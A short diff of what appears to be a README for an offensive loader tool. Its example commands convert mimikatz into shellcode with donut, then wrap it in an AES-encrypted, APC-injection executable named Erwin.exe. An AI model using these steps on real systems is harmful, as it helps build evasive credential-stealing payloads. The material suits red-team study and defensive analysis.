@@ -42,7 +42,9 @@ donut.exe --input:mimikatz.exe --output:mimi.bin
 ### Example Command
 ```bash
 donut.exe --input:mimikatz.exe --output:mimi.bin
+...
 The_Founding.exe mimi.bin aes APC --compile
+...
 Compilation successful.
 Shinzo wo Sasageyo! Erwin.exe Created.
 ```
